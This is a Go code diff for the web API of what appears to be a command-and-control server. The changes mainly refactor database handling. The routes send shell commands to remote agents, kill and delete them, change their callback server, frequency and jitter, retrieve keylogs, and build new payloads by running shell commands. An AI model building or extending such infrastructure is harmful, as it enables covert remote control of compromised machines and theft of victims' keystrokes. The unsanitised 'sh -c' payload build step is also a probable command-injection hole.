@@ -35,11 +35,9 @@ func main() {
 	publickey := goDotEnvVariable("PUBLIC_KEY")
 	webserverip := goDotEnvVariable("WEBSERVER_IP")
 	webserverport := goDotEnvVariable("WEBSERVER_PORT")
-	err := data.OpenDatabase()
-	if err != nil {
-		logger.Logf(logger.Info, "Error in DB\n")
-		log.Fatalln(err)
-	}
+	db  := data.OpenDatabase()
+	
+	defer db.Close()
 	r := chi.NewRouter()
 	r.Use(yin.SimpleLogger)
 	r.Use(cors.Handler(cors.Options{
@@ -49,21 +47,21 @@ func main() {
 
 	r.Get("/api/agents", func(w http.ResponseWriter, r *http.Request) {
 		res, _ := yin.Event(w, r)
-		agents := data.Agents()
+		agents := data.Agents(db)
 		res.SendJSON(agents)
 	})
 
 	r.Get("/api/oneagent/{agt}", func(w http.ResponseWriter, r *http.Request) {
 		agentParam := chi.URLParam(r, "agt")
 		res, _ := yin.Event(w, r)
-		agent := data.FetchOne(agentParam)
+		agent := data.FetchOne(db, agentParam)
 		res.SendJSON(agent)
 	})
 
 	r.Get("/api/agent/{agt}", func(w http.ResponseWriter, r *http.Request) {
 		agentParam := chi.URLParam(r, "agt")
 		res, _ := yin.Event(w, r)
-		agent := data.Agent(agentParam)
+		agent := data.Agent(db, agentParam)
 		res.SendJSON(agent)
 	})
 
@@ -73,7 +71,7 @@ func main() {
 		newCmdID := uuid.New().String()
 		body := map[string]string{}
 		req.BindBody(&body)
-		data.SendAgentCommand(agentParam, "0", "shell", body["command"], newCmdID) // from web
+		data.SendAgentCommand(db, agentParam, "0", "shell", body["command"], newCmdID) // from web
 		// res.SendString(agentParam + "0" + "shell" + body["command"] + newCmdID)
 		res.SendStatus(200)
 	})
@@ -100,8 +98,8 @@ func main() {
 			res.SendString("Invalid Callback Jitter, Max 100")
 		} else {
 
-			data.UpdateAgentConfig(agentParam, body["callbackserver"], body["callbackfreq"], body["callbackjitter"])
-			data.SendAgentCommand(agentParam, "0", "update", body["callbackfreq"]+":"+body["callbackjitter"], newCmdID) // from web
+			data.UpdateAgentConfig(db, agentParam, body["callbackserver"], body["callbackfreq"], body["callbackjitter"])
+			data.SendAgentCommand(db, agentParam, "0", "update", body["callbackfreq"]+":"+body["callbackjitter"], newCmdID) // from web
 			// res.SendString(agentParam + "0" + "shell" + body["command"] + newCmdID)
 			res.SendString("Success")
 		}
@@ -111,7 +109,7 @@ func main() {
 		agentParam := chi.URLParam(r, "agt")
 		newCmdID := uuid.New().String()
 		res, _ := yin.Event(w, r)
-		data.SendAgentCommand(agentParam, "0", "kill", "Kill Agent", newCmdID) // from web
+		data.SendAgentCommand(db, agentParam, "0", "kill", "Kill Agent", newCmdID) // from web
 		res.SendString("Success")
 	})
 
@@ -120,22 +118,22 @@ func main() {
 		newCmdID := uuid.New().String()
 		res, _ := yin.Event(w, r)
 		//kill first
-		data.SendAgentCommand(agentParam, "0", "kill", "Kill Agent", newCmdID)
+		data.SendAgentCommand(db, agentParam, "0", "kill", "Kill Agent", newCmdID)
 		//then delete
-		data.DeleteAgent(agentParam)
+		data.DeleteAgent(db, agentParam)
 		res.SendString("Success")
 	})
 
 	r.Get("/api/keylog/{agt}", func(w http.ResponseWriter, r *http.Request) {
 		agentParam := chi.URLParam(r, "agt")
 		res, _ := yin.Event(w, r)
-		agent := data.Keylog(agentParam)
+		agent := data.Keylog(db, agentParam)
 		res.SendJSON(agent)
 	})
 
 	r.Get("/api/payloads", func(w http.ResponseWriter, r *http.Request) {
 		res, _ := yin.Event(w, r)
-		payloads := data.Payloads()
+		payloads := data.Payloads(db)
 		res.SendJSON(payloads)
 	})
 
@@ -196,12 +194,12 @@ func main() {
 				)
 			}
 			fmt.Println("body")
-			err = exec.Command("sh", "-c", commandString).Run()
+			err := exec.Command("sh", "-c", commandString).Run()
 			if err != nil {
 				res.SendStatus(500)
 			}
 
-			data.CreatePayload(newPayID, body["name"], body["description"], body["serverip"], body["serverport"], body["callbackfrequency"], body["callbackjitter"], concat) // from web
+			data.CreatePayload(db, newPayID, body["name"], body["description"], body["serverip"], body["serverport"], body["callbackfrequency"], body["callbackjitter"], concat) // from web
 			res.SendString("Success")
 		}
 	})
